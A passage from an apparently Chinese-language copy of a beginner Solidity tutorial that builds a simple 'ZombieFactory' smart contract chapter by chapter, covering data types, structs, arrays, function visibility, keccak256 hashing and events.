无符号数据类型， 指<strong>其值不能是负数</strong>，对于有符号的整数存在名为 <code>int</code> 的数据类型。</p><blockquote><p>注: Solidity中， <code>uint</code> 实际上是 <code>uint256</code>代名词， 一个256位的无符号整数。你也可以定义位数少的uints — <code>uint8</code>， <code>uint16</code>， <code>uint32</code>， 等…… 但一般来讲你愿意使用简单的 <code>uint</code>， 除非在某些特殊情况下，这我们后面会讲。</p></blockquote><p><strong>实战演习</strong></p><p>我们的僵尸DNA将由一个十六位数字组成。</p><p>定义 <code>dnaDigits</code> 为 <code>uint</code> 数据类型, 并赋值 <code>16</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第4章-数学运算"><a href="#第4章-数学运算" class="headerlink" title="第4章: 数学运算"></a>第4章: 数学运算</h3><p>在 Solidity 中，数学运算很直观明了，与其它程序设计语言相同:</p><ul><li>加法: <code>x + y</code></li><li>减法: <code>x - y</code>,</li><li>乘法: <code>x * y</code></li><li>除法: <code>x / y</code></li><li>取模 / 求余: <code>x % y</code> <em>(例如, <code>13 % 5</code> 余 <code>3</code>, 因为13除以5，余3)</em></li></ul><p>Solidity 还支持 *<strong>乘方操作*</strong> (如：x 的 y次方） // 例如： 5 ** 2 = 25</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint x = 5 ** 2; // equal to 5^2 = 25</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>为了保证我们的僵尸的DNA只含有16个字符，我们先造一个<code>uint</code>数据，让它等于10^16。这样一来以后我们可以用模运算符 <code>%</code> 把一个整数变成16位。</p><ol><li>建立一个<code>uint</code>类型的变量，名字叫<code>dnaModulus</code>, 令其等于 <strong>10 的 <code>dnaDigits</code> 次方</strong>.</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第5章-结构体"><a href="#第5章-结构体" class="headerlink" title="第5章: 结构体"></a>第5章: 结构体</h3><p>有时你需要更复杂的数据类型，Solidity 提供了 <strong>结构体</strong>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Person {</span><br><span class="line">  uint age;</span><br><span class="line">  string name;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结构体允许你生成一个更复杂的数据类型，它有多个属性。</p><blockquote><p>注：我们刚刚引进了一个新类型, <code>string</code>。 字符串用于保存任意长度的 UTF-8 编码数据。 如： <code>string greeting = "Hello world!"</code>。</p></blockquote><p><strong>实战演习</strong></p><p>在我们的程序中，我们将创建一些僵尸！每个僵尸将拥有多个属性，所以这是一个展示结构体的完美例子。</p><ol><li>建立一个<code>struct</code> 命名为 <code>Zombie</code>.</li><li>我们的 <code>Zombie</code> 结构体有两个属性： <code>name</code> (类型为 <code>string</code>), 和 <code>dna</code> (类型为 <code>uint</code>)。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第6章-数组"><a href="#第6章-数组" class="headerlink" title="第6章: 数组"></a>第6章: 数组</h3><p>如果你想建立一个集合，可以用 <strong>数组</strong>这样的数据类型. Solidity 支持两种数组: <strong>静态</strong>数组和<strong>动态</strong>数组:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度为2的静态数组:</span><br><span class="line">uint[2] fixedArray;</span><br><span class="line">// 固定长度为5的string类型的静态数组:</span><br><span class="line">string[5] stringArray;</span><br><span class="line">// 动态数组，长度不固定，可以动态添加元素:</span><br><span class="line">uint[] dynamicArray;</span><br></pre></td></tr></tbody></table></figure><p>你也可以建立一个 <strong>结构体</strong>类型的数组 例如，上一章提到的 <code>Person</code>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person[] people; // 这是动态数组，我们可以不断添加元素</span><br></pre></td></tr></tbody></table></figure><p>记住：状态变量被永久保存在区块链中。所以在你的合约中创建动态数组来保存成结构的数据是非常有意义的。</p><p><strong>公共数组</strong></p><p>你可以定义 <code>public</code> 数组, Solidity 会自动创建 <strong>getter</strong> 方法. 语法如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person[] public people;</span><br></pre></td></tr></tbody></table></figure><p>其它的合约可以从这个数组读取数据（但不能写入数据），所以这在合约中是一个有用的保存公共数据的模式。</p><p><strong>实战演习</strong></p><p>为了把一个僵尸部队保存在我们的APP里，并且能够让其它APP看到这些僵尸，我们需要一个公共数组。</p><ol><li>创建一个数据类型为 <code>Zombie</code> 的结构体数组，用 <code>public</code> 修饰，命名为：<code>zombies</code>.</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第7章-定义函数"><a href="#第7章-定义函数" class="headerlink" title="第7章: 定义函数"></a>第7章: 定义函数</h3><p>在 Solidity 中函数定义的句法如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function eatHamburgers(string _name, uint _amount) {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是一个名为 <code>eatHamburgers</code> 的函数，它接受两个参数：一个 <code>string</code>类型的 和 一个 <code>uint</code>类型的。现在函数内部还是空的。</p><blockquote><p>注：: 习惯上函数里的变量都是以(<code>_</code>)开头 (但不是硬性规定) 以区别全局变量。我们整个教程都会沿用这个习惯。</p></blockquote><p>我们的函数定义如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eatHamburgers("vitalik", 100);</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>在我们的应用里，我们要能创建一些僵尸，让我们写一个函数做这件事吧！</p><ol><li>建立一个函数 <code>createZombie</code>。 它有两个参数: <strong>_name</strong> (类型为<code>string</code>), 和 <strong>_dna</strong> (类型为<code>uint</code>)。</li></ol><p>暂时让函数空着——我们在后面会增加内容。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function createZombie(string _name, uint _dna) {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第8章-使用结构体和数组"><a href="#第8章-使用结构体和数组" class="headerlink" title="第8章: 使用结构体和数组"></a>第8章: 使用结构体和数组</h3><p><strong>创建新的结构体</strong></p><p>还记得上个例子中的 <code>Person</code> 结构吗？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Person {</span><br><span class="line">  uint age;</span><br><span class="line">  string name;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Person[] public people;</span><br></pre></td></tr></tbody></table></figure><p>现在我们学习创建新的 <code>Person</code> 结构，然后把它加入到名为 <code>people</code> 的数组中.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 创建一个新的Person:</span><br><span class="line">Person satoshi = Person(172, "Satoshi");</span><br><span class="line"></span><br><span class="line">// 将新创建的satoshi添加进people数组:</span><br><span class="line">people.push(satoshi);</span><br></pre></td></tr></tbody></table></figure><p>你也可以两步并一步，用一行代码更简洁:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">people.push(Person(16, "Vitalik"));</span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：<code>array.push()</code> 在数组的 <strong>尾部</strong> 加入新元素 ，所以元素在数组中的顺序就是我们添加的顺序， 如:</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[] numbers;</span><br><span class="line">numbers.push(5);</span><br><span class="line">numbers.push(10);</span><br><span class="line">numbers.push(15);</span><br><span class="line">// The `numbers` array is now equal to [5, 10, 15]</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>让我们创建名为createZombie的函数来做点儿什么吧。</p><ol><li>在函数体里新创建一个 <code>Zombie</code>， 然后把它加入 <code>zombies</code> 数组中。 新创建的僵尸的 <code>name</code> 和 <code>dna</code>，来自于函数的参数。</li><li>让我们用一行代码简洁地完成它。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function createZombie(string _name, uint _dna) {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第9章-私有-公共函数"><a href="#第9章-私有-公共函数" class="headerlink" title="第9章: 私有 / 公共函数"></a>第9章: 私有 / 公共函数</h3><p>Solidity 定义的函数的属性默认为<code>公共</code>。 这就意味着任何一方 (或其它合约) 都可以调用你合约里的函数。</p><p>显然，不是什么时候都需要这样，而且这样的合约易于受到攻击。 所以将自己的函数定义为<code>私有</code>是一个好的编程习惯，只有当你需要外部世界调用它时才将它设置为<code>公共</code>。</p><p>如何定义一个私有的函数呢？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[] numbers;</span><br><span class="line"></span><br><span class="line">function _addToArray(uint _number) private {</span><br><span class="line">  numbers.push(_number);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这意味着只有我们合约中的其它函数才能够调用这个函数，给 <code>numbers</code> 数组添加新成员。</p><p>可以看到，在**<u>函数名字后面使用关键字 <code>private</code> 即可</u><strong>。</strong><u>和函数的参数类似，私有函数的名字用(<code>_</code>)起始。</u>**</p><p><strong>实战演习</strong></p><p>我们合约的函数 <code>createZombie</code> 的默认属性是公共的，这意味着任何一方都可以调用它去创建一个僵尸。 咱们来把它变成私有吧！</p><ol><li>变 <code>createZombie</code> 为私有函数，不要忘记遵守命名的规矩哦！</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第10章-函数的更多属性"><a href="#第10章-函数的更多属性" class="headerlink" title="第10章: 函数的更多属性"></a>第10章: 函数的更多属性</h3><p>本章中我们将学习函数的返回值和修饰符。</p><p><strong>返回值</strong></p><p>要想函数返回一个数值，按如下定义：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string greeting = "What's up dog";</span><br><span class="line"></span><br><span class="line">function sayHello() public returns (string) {</span><br><span class="line">  return greeting;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Solidity 里，函数的定义里可包含返回值的数据类型(如本例中 <code>string</code>)。</p><p><strong>函数的修饰符</strong></p><p>上面的函数实际上没有改变 Solidity 里的状态，即，它没有改变任何值或者写任何东西。</p><p>这种情况下我们可以把函数定义为 <strong>view</strong>, 意味着它只能读取数据不能更改数据:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function sayHello() public view returns (string) {</span><br></pre></td></tr></tbody></table></figure><p>Solidity 还支持 <strong>pure</strong> 函数, 表明这个函数甚至都不访问应用里的数据，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function _multiply(uint a, uint b) private pure returns (uint) {</span><br><span class="line">  return a * b;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><u><strong>这个函数甚至都不读取应用里的状态 — 它的返回值完全取决于它的输入参数，在这种情况下我们把函数定义为 pure.</strong></u></p><blockquote><p>注：可能很难记住何时把函数标记为 pure/view。 幸运的是， Solidity 编辑器会给出提示，提醒你使用这些修饰符。</p></blockquote><p><strong>实战演习</strong></p><p>我们想建立一个帮助函数，它根据一个字符串随机生成一个DNA数据。</p><ol><li>创建一个 <code>private</code> 函数，命名为 <code>_generateRandomDna</code>。它只接收一个输入变量 <code>_str</code> (类型 <code>string</code>), 返回一个 <code>uint</code> 类型的数值。</li><li>此函数只读取我们合约中的一些变量，所以标记为<code>view</code>。</li><li>函数内部暂时留空，以后我们再添加代码。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第11章-Keccak256-和-类型转换"><a href="#第11章-Keccak256-和-类型转换" class="headerlink" title="第11章: Keccak256 和 类型转换"></a>第11章: Keccak256 和 类型转换</h3><p>如何让 <code>_generateRandomDna</code> 函数返回一个全(半) 随机的 <code>uint</code>?</p><p>Ethereum 内部有一个散列函数<code>keccak256</code>，它用了SHA3版本。一个散列函数基本上就是把一个字符串转换为一个256位的16进制数字。字符串的一个微小变化会引起散列数据极大变化。</p><p>这在 Ethereum 中有很多应用，但是现在我们只是用它造一个伪随机数。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//6e91ec6b618bb462a4a6ee5aa2cb0e9cf30f7a052bb467b0ba58b8748c00d2e5</span><br><span class="line">keccak256("aaaab");</span><br><span class="line">//b1f078126895a1424524de5321b339ab00408010b7cf0e6ed451514981e58aa9</span><br><span class="line">keccak256("aaaac");</span><br></pre></td></tr></tbody></table></figure><p>显而易见，输入字符串只改变了一个字母，输出就已经天壤之别了。</p><blockquote><p>注: 在区块链中<strong>安全地</strong>产生一个随机数是一个很难的问题， 本例的方法不安全，但是在我们的Zombie DNA算法里不是那么重要，已经很好地满足我们的需要了。</p></blockquote><p><strong>类型转换</strong></p><p>有时你需要变换数据类型。例如:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint8 a = 5;</span><br><span class="line">uint b = 6;</span><br><span class="line">// 将会抛出错误，因为 a * b 返回 uint, 而不是 uint8:</span><br><span class="line">uint8 c = a * b;</span><br><span class="line">// 我们需要将 b 转换为 uint8:</span><br><span class="line">uint8 c = a * uint8(b);</span><br></pre></td></tr></tbody></table></figure><p>上面, <code>a * b</code> 返回类型是 <code>uint</code>, 但是当我们尝试用 <code>uint8</code> 类型接收时, 就会造成潜在的错误。如果把它的数据类型转换为 <code>uint8</code>, 就可以了，编译器也不会出错。</p><p><strong>实战演习</strong></p><p>给 <code>_generateRandomDna</code> 函数添加代码! 它应该完成如下功能:</p><ol><li>第一行代码取 <code>_str</code> 的 <code>keccak256</code> 散列值生成一个伪随机十六进制数，类型转换为 <code>uint</code>, 最后保存在类型为 <code>uint</code> 名为 <code>rand</code> 的变量中。</li><li>我们只想让我们的DNA的长度为16位 (还记得 <code>dnaModulus</code>?)。所以第二行代码应该 <code>return</code> 上面计算的数值对 <code>dnaModulus</code> 求余数(<code>%</code>)。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第12章-放在一起"><a href="#第12章-放在一起" class="headerlink" title="第12章: 放在一起"></a>第12章: 放在一起</h3><p>我们就快完成我们的随机僵尸制造器了，来写一个公共的函数把所有的部件连接起来。</p><p>写一个公共函数，它有一个参数，用来接收僵尸的名字，之后用它生成僵尸的DNA。</p><p><strong>实战演习</strong></p><ol><li>创建一个 <code>public</code> 函数，命名为 <code>createRandomZombie</code>. 它将被传入一个变量 <code>_name</code> (数据类型是 <code>string</code>)。 *(注: 定义公共函数 <code>public</code> 和定义一个私有 <code>private</code> 函数的做法一样)*。</li><li>函数的第一行应该调用 <code>_generateRandomDna</code> 函数，传入 <code>_name</code> 参数, 结果保存在一个类型为 <code>uint</code> 的变量里，命名为 <code>randDna</code>。</li><li>第二行调用 <code>_createZombie</code> 函数， 传入参数： <code>_name</code> 和 <code>randDna</code>。</li><li>整个函数应该是4行代码 (包括函数的结束符号 <code>}</code> )。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    // 这里建立事件</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createRandomZombie(string _name) public {</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第13章-事件"><a href="#第13章-事件" class="headerlink" title="第13章: 事件"></a>第13章: 事件</h3><p>我们的合约几乎就要完成了！让我们加上一个<strong>事件</strong>.</p><p><strong>事件</strong> 是合约和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 这里建立事件</span><br><span class="line">event IntegersAdded(uint x, uint y, uint result);</span><br><span class="line"></span><br><span class="line">function add(uint _x, uint _y) public {</span><br><span class="line">  uint result = _x + _y;</span><br><span class="line">  //触发事件，通知app</span><br><span class="line">  IntegersAdded(_x, _y, result);</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>你的 app 前端可以监听这个事件。JavaScript 实现如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">YourContract.IntegersAdded(function(error, result) {</span><br><span class="line">  // 干些事</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>我们想每当一个僵尸创造出来时，我们的前端都能监听到这个事件，并将它显示出来。</p><p>1。 定义一个 <code>事件</code> 叫做 <code>NewZombie</code>。 它有3个参数: <code>zombieId</code> (<code>uint</code>)， <code>name</code> (<code>string</code>)， 和 <code>dna</code> (<code>uint</code>)。</p><p>2。 修改 <code>_createZombie</code> 函数使得当新僵尸造出来并加入 <code>zombies</code>数组后，生成事件<code>NewZombie</code>。</p><p>3。 需要定义僵尸<code>id</code>。 <code>array.push()</code> 返回数组的长度类型是<code>uint</code> - 因为数组的第一个元素的索引是 0， <code>array.push() - 1</code> 将是我们加入的僵尸的索引。 <code>zombies.push() - 1</code> 就是 <code>id</code>，数据类型是 <code>uint</code>。在下一行中你可以把它用到 <code>NewZombie</code> 事件中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 